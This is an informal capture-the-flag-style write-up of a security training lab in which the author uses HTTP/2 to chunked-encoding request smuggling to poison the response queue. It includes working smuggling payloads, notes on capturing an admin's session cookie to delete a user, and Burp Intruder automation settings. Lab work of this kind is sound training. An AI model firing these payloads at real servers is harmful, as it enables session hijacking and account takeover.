# Practitioner Lab 136: Response queue poisoning via H2.TE request smuggling

---

This lab is vulnerable to request smuggling because the front-end server downgrades HTTP/2 requests even if they have an ambiguous length.

To solve the lab, delete the user `carlos` by using response queue poisoning to break into the admin panel at `/admin`. An admin user will log in approximately every 15 seconds.

The connection to the back-end is reset every 10 requests, so don't worry if you get it into a bad state - just send a few normal requests to get a fresh connection.

![Untitled](Practitioner%20Lab%20136%20Response%20queue%20poisoning%20via%20%2058b9882dc7a544d4abc46850e757622d/Untitled.png)

![Untitled](Practitioner%20Lab%20136%20Response%20queue%20poisoning%20via%20%2058b9882dc7a544d4abc46850e757622d/Untitled%201.png)

When I sent this request twice and it did not send me too a 404 meaning that it is probably a TE

when I sent a normal smuggling test request through http 1 it gave me the following error saying that I couldnt use both transfer encoding as well as content length.

![Untitled](Practitioner%20Lab%20136%20Response%20queue%20poisoning%20via%20%2058b9882dc7a544d4abc46850e757622d/Untitled%202.png)

this gave me a 404 meaning that the request was smuggled showing me that I managed to get do the poc sucessfully and telling me that the server is using TE

![Untitled](Practitioner%20Lab%20136%20Response%20queue%20poisoning%20via%20%2058b9882dc7a544d4abc46850e757622d/Untitled%203.png)

```
POST /my-account HTTP/2
Host: 0a8b00630439d57a829d2edb0039005a.web-security-academy.net
Transfer-Encoding: chunked
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked

0

GET /try HTTP/1.1
Host: 0a8b00630439d57a829d2edb0039005a.web-security-academy.net

```

After playing around with it I managed to capture a request from the admin. 

![Untitled](Practitioner%20Lab%20136%20Response%20queue%20poisoning%20via%20%2058b9882dc7a544d4abc46850e757622d/Untitled%204.png)

After adding that session cookie I was able to access the admin page. 

![Untitled](Practitioner%20Lab%20136%20Response%20queue%20poisoning%20via%20%2058b9882dc7a544d4abc46850e757622d/Untitled%205.png)

This solved the lab. 

Another solution is to do the following:

```
POST /x HTTP/2
Host: YOUR-LAB-ID.web-security-academy.net
Transfer-Encoding: chunked

0

GET /x HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
```

This will simply give you a 404 response unless its one from another user. 

To automate this use the above payload, send it to intruder, Make sure that the update content length is off in intruder. And play with the resource pool so that it only sends one concurrent request with a delay of around 800.